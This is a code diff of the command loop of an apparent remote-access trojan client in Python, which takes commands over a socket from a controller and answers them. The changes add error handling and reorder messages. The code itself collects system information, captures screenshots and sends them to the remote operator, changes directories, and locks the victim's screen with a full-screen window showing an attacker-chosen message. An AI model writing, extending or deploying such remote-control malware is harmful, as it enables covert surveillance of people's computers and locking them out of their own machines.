@@ -38,11 +38,15 @@ def recieveCommands():
     while True:
         data = s.recv(8192)
         if data[:].decode("utf-8") == 'sysinfo':
-            systemInfo = (CYAN + 'Machine: ' + END + GREEN + platform.machine() + END + '\n' + CYAN + 'Version: ' + END + GREEN + platform.version() + END + '\n' 
-            + CYAN + 'Platform: ' + END + GREEN + platform.platform() + END + '\n' + CYAN + 'System: ' 
-            + END + GREEN + platform.system() + END + '\n' + CYAN + 'Processor: ' + END + GREEN + platform.processor() + END + '\n')
-            str(systemInfo)
-            s.send(str.encode(systemInfo))
+            try:
+                systemInfo = ('\n' + CYAN + 'Machine: ' + END + GREEN + platform.machine() + END + '\n' + CYAN + 'Version: ' + END + GREEN + platform.version() + END + '\n'
+                + CYAN + 'Platform: ' + END + GREEN + platform.platform() + END + '\n' + CYAN + 'System: '
+                + END + GREEN + platform.system() + END + '\n' + CYAN + 'Processor: ' + END + GREEN + platform.processor() + END + '\n')
+                str(systemInfo)
+                s.send(str.encode(systemInfo))
+            except:
+                error = (RED + '[!] There was an unknown error!')
+                s.send(str.encode(error))
         elif data[:2].decode("utf-8") == 'cd':
             os.chdir(data[3:].decode("utf-8"))
         elif data[:].decode("utf-8") == 'screenshot':
@@ -60,7 +64,7 @@ def recieveCommands():
             except:
                 screenshotFailed = ('\n' + RED + "[!] Couldn't take screenshot " + END + '\n')
                 str(screenshotFailed)
-                s.send(str.encode(screenshotFailed))        
+                s.send(str.encode(screenshotFailed))
         elif data[:].decode("utf-8") == 'download -s':
             try:
                 with open(pathToScreenshot, "rb") as image_file:
@@ -109,13 +113,15 @@ def recieveCommands():
         elif data[:].decode("utf-8") == 'memory':
             try:
                 mem = str(virtual_memory())
-                virtualram = '\n' + GREEN + 'Available memory in bytes: ' + END + CYAN + mem + END + '\n'
+                virtualram = '\n' + GREEN + 'Available memory in bytes: ' + END + CYAN + mem + END
                 s.send(str.encode(virtualram))
             except:
                 error = RED + "[!] Couldn't get virtual ram" + END + '\n'
                 s.send(str.encode(error))
         elif data[:4].decode("utf-8") == 'lock':
             try:
+                successSend = ('\n' + GREEN + '[*] Successfully locked computer screen' + END + '\n')
+                s.send(str.encode(successSend))
                 message = data[5:].decode('utf-8')
                 class App():
                     def __init__(self):
@@ -130,20 +136,14 @@ def recieveCommands():
                         l = tk.Label(self.main_frame, text=message)
                         l.pack()
                         self.root.mainloop()
-                    
                     def opennote(self, event):
                         self.n = tk.Text(self.main_frame, background='blue')
                         self.n.pack()
-                    
                     def closenote(self, event):
                         self.n.destroy()
-                    
                     def quit(self, event):
                         self.root.destroy()
-                    
                 App()
-                successSend = ('\n' + GREEN + '[*] Successfully locked computer screen' + END + '\n')
-                s.send(str.encode(successSend))
             except:
                 error = '\n' + RED + '[!] There was an error locking the screen' + END + '\n'
                 s.send(str.encode(error))
